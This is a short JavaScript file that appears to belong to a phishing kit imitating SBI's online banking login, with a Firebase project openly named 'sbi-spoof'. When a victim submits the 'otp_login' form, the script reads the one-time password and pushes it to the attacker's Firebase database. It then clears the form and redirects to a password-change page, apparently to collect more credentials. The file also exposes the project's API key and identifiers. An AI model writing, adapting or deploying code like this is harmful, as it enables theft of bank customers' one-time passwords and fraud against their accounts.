const firebaseConfig = {
    apiKey: "AIzaSyCOKI3PTEQxV-nQXQiRLVOi4_Gc5kRAuEw",
    authDomain: "sbi-spoof.firebaseapp.com",
    databaseURL: "https://sbi-spoof-default-rtdb.firebaseio.com",
    projectId: "sbi-spoof",
    storageBucket: "sbi-spoof.appspot.com",
    messagingSenderId: "955522153499",
    appId: "1:955522153499:web:4f18672b1d5a8750618cbe",
    measurementId: "G-35F13H8VZH"
  };

  // initialize firebase
firebase.initializeApp(firebaseConfig);

//For Otp 1
// reference your database
var spoofData = firebase.database().ref("sbi-spoof-otp-login");

document.getElementById("otp_login").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    var otp1 = getElementVal("otp1");
   

    saveOtpLogin(otp1);

    //   reset the form
    document.getElementById("otp_login").reset();
    window.location.href = "s/passwordChange.html";
}
const saveOtpLogin = (otp1) => {
    var newSpoofData = spoofData.push();

    newSpoofData.set({
        otp_login: otp1,
    });
};
const getElementVal = (id) => {
    return document.getElementById(id).value;
};